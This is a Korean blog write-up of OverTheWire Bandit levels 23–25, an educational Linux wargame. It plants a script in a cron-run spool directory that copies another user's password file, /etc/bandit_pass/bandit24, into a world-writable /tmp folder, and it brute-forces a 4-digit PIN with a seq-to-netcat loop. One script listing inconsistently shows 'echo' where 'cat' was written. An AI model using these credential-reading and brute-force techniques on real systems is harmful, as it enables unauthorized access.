---
title: "OverTheWire Bandit Level 23 ~ 24 문제 풀이"
date: 2025-03-30 00:20:00 +0800
categories: [Wargame, Bandit]
tags: [cyber security, writeup, overthewire, bandit, linux]
description: OverTheWire Bandit 레벨 23에서 24까지 문제 풀이
---

# 문제 리스트
## Level 23 -> 24
[https://overthewire.org/wargames/bandit/bandit24.html](https://overthewire.org/wargames/bandit/bandit24.html)
### 문제 설명
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
### 문제 풀이
이번에도 이 전과 마찬가지로 cron 관련 문제이다.<br />
좀 할 것이 많은지 문제 설명부터 잔뜩 겁을 주고있는 것이 보인다.<br />
#### /etc/cron.d와 bandit24.sh 분석
```bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
/etc/cron.d 디렉토리에 접근하면 역시나 bandit24 유저의 cronjob이 보인다.<br />
해당 파일을 살펴보면 주기적으로 어떤 코드가 실행되는지 볼 수 있는데 bandit24는 /usr/bin/cronjob_bandit24.sh 파일을 실행시킨다.<br />

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
해당 파일이 무엇을 수행하는지 알아보아야한다.<br />
코드를 보면, bandit24.sh는 /var/spool/bandit24/foo 라는 디렉토리에 있는 bandit23의 권한을 가지는 파일들을 모두 실행시키는 역할을 하는 것을 알 수 있다. 그리고 중간에 timeout 명령어를 사용해서 모든 파일들 각각의 수행 시간이 1분을 넘어가지 않도록 강제하고있다.<br />
#### /var/spool/bandit24/foo 파일 생성 테스트
```bash
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo

bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied

bandit23@bandit:/var/spool/bandit24/foo$ vim sample.sh
#!/bin/bash

echo hello
```
우선 해당 디렉토리로 이동을 해서 ls 명령어를 수행해보았는데 권한이 막혀있다.<br />
그래서 혹시 파일 생성도 안되는지 궁금해서 vim을 이용해 샘플 쉘코드를 하나 작성하니 정상적으로 저장이 되는 것을 보니 쓰기 권한은 열려있는 듯 하다.<br />
#### bandit24 비밀번호 알아내기
```bash
bandit23@bandit:/tmp$ mkdir /tmp/tmp_pass
bandit23@bandit:/tmp$ mkdir /tmp/tmp_pass/bandit24
bandit23@bandit:/tmp$ cd /tmp/tmp_pass/bandit24
```
이런식으로 새로운 임시 디렉토리를 하나 만들어 준다. 다른 디렉토리에는 각종 권한이 부족하여 해당 문제를 풀이하는 데에 부적절할 것으로 보인다.<br />

```bash
# revealer.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp_pass/bandit24.txt
```
이런식으로 revealer.sh라는 파일 하나를 새로 만든 디렉토리에 작성한다.<br />

```bash
bandit23@bandit:/tmp/tmp_pass/bandit24$ cat revealer.sh
# revealer.sh
#!/bin/bash

echo /etc/bandit_pass/bandit24 > /tmp/tmp_pass/bandit24.txt

bandit23@bandit:/tmp/tmp_pass/bandit24$ ls -l revealer.sh
-rw-rw-r-- 1 bandit23 bandit23 87 Mar 30 14:10 revealer.sh
```
그런 다음에 해당 쉘 파일의 권한을 확인해보면 다른 유저가 실행할 수가 없는 것을 알 수 있다.<br />
우리가 작성한 이 파일은 bandit24가 cron으로 실행되는 코드가 될 것인데 bandit24 유저가 해당 파일을 실행할 권한이 없기 때문에 부여해주어야 한다.<br />

```bash
bandit23@bandit:/tmp/tmp_pass/bandit24$ chmod 777 revealer.sh

bandit23@bandit:/tmp/tmp_pass/bandit24$ ls -l revealer.sh
-rwxrwxrwx 1 bandit23 bandit23 87 Mar 30 14:10 revealer.sh
```
귀찮으니까 777 권한을 부여해주었다. 

```bash
bandit23@bandit:/tmp/tmp_pass/bandit24$ ls -al /tmp/tmp_pass
total 17016
drwxrwxr-x 3 bandit23 bandit23     4096 Mar 30 14:08 .
drwxrwx-wt 1 root     root     17412096 Mar 30 14:18 ..
drwxrwxr-x 2 bandit23 bandit23     4096 Mar 30 14:10 bandit24

bandit23@bandit:/tmp/tmp_pass/bandit24$ chmod o+w /tmp/tmp_pass

bandit23@bandit:/tmp/tmp_pass/bandit24$ ls -al /tmp/tmp_pass
total 17016
drwxrwxrwx 3 bandit23 bandit23     4096 Mar 30 14:08 .
drwxrwx-wt 1 root     root     17412096 Mar 30 14:19 ..
drwxrwxr-x 2 bandit23 bandit23     4096 Mar 30 14:10 bandit24
```
위에서 작성한 쉘 코드를 다시 살펴보면 bandit24 유저가 /tmp/tmp_pass라는 디렉토리에 bandit24.txt라는 파일을 생성한다. 그렇다는 것은 bandit24 유저가 /tmp/tmp_pass 디렉토리에 write 권한이 있는지 체크를 해야한다.<br />
현 상황에서는 없으니 `o+w` 권한을 부여해주었다.<br />

```bash
bandit23@bandit:/tmp/tmp_pass$ cp /tmp/tmp_pass/bandit24/revealer.sh /var/spool/bandit24/foo
```
이렇게 쉘 파일 작성과 모든 권한 문제가 해결됐으니 이제 이 파일을 /var/spool/bandit24/foo로 넘겨주면 bandit24의 cron에 의해 해당 파일이 자동으로 실행되면서 비밀번호를 담은 텍스트 파일이 /tmp/tmp_pass 디렉토리에 생성될 것이다.<br />

```bash
bandit23@bandit:/tmp/tmp_pass$ ls
bandit24  bandit24.txt

bandit23@bandit:/tmp/tmp_pass$ cat bandit24.txt
BANDIT24_PASSWORD
```
## Level 24 -> 25
[https://overthewire.org/wargames/bandit/bandit25.html](https://overthewire.org/wargames/bandit/bandit25.html)
### 문제 설명
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
### 문제 풀이
이번에는 이 전과는 다르게 아주 간단한 문제이다.<br />

로컬호스트의 30002 포트에 접속하여 4자리로 구성된 비밀번호를 입력하여 bandit25 비밀번호를 알아내는 문제이다.<br />

4자리 비밀번호로 0000부터 9999까지 하나씩 다 시도해보는 방식(Brute Forcing)을 사용하여 해결해야 한다.<br /> 우선 brute forcing 코드를 어떤 식으로 짜야할지 고민하기 위해 테스트 접속을 해보자.<br />
#### 테스트 접속
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
BANDIT24_PASSWORD 0123
Wrong! Please enter the correct current password and pincode. Try again.
```
해당 포트에 접속하면 pincode checker 프로그램의 안내 문구가 뜨고 입력 포멧을 알려준다.<br />
bandit24의 비밀번호와 4자리 pincode를 입력하면 되고 두 비밀번호는 스페이스로 구분하면 된다고 한다. 아무 비밀번호나 입력해보니 틀렸다는 문구가 뜬다.<br />

이제 어떻게 어떻게 입력해야하는지 알아냈으니 코드를 짜보자.
#### 최종 코드
```bash
bandit24@bandit:~$ for pin in $(seq -w 0000 9999); do     
echo "BANDIT24_PASSWORD $pin"; 
done | nc localhost 30002
```
이런식으로 0000부터 9999까지 하나하나 시도하는 코드를 작성하여 그대로 실행하면 순식간에 코드가 실행되면서 올바른 pincode가 입력됐을 때 bandit25의 비밀번호가 출력되는 것을 확인할 수 있다.
# 배운 것
이번 챌린지들을 도전하면서 shell 코드의 기본적인 구조나 변수 사용법 등을 익힐 수 있었다.